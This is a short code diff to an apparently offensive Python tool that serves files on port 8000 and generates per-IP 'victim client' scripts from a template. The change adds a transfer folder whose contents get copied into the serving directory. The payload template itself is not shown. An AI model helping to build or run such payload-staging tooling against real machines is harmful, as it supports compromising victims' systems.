@@ -7,9 +7,10 @@ import netifaces
 PORT = 8000
 SERVING_DIRECTORY = '/tmp/pheelpwncat/'
 VICTIM_CLIENT_FILENAME = 'victim_client_template.py'
+TRANSFER_FOLDER = 'transfer/'
 
 def main():
-    prepare_serving_directory(SERVING_DIRECTORY)
+    prepare_serving_directory(SERVING_DIRECTORY, TRANSFER_FOLDER)
     os.chdir(SERVING_DIRECTORY)
     ipv4s = fetch_ipv4_addresses()
     create_victim_clients_for_addresses(VICTIM_CLIENT_FILENAME, ipv4s)
@@ -41,9 +42,11 @@ def create_victim_clients_for_addresses(template_filename, ipv4s):
         with open(address_specific_filename, 'w') as file:
             file.write(address_specific_data)
 
-def prepare_serving_directory(directory):
+def prepare_serving_directory(directory, transfer_folder):
     os.makedirs(directory, exist_ok=True)
     shutil.copy2(VICTIM_CLIENT_FILENAME, directory)
+    for filename in os.listdir(transfer_folder):
+        shutil.copy2(transfer_folder + filename, directory)
 
 def fetch_ipv4_addresses():
     ip_list = set()
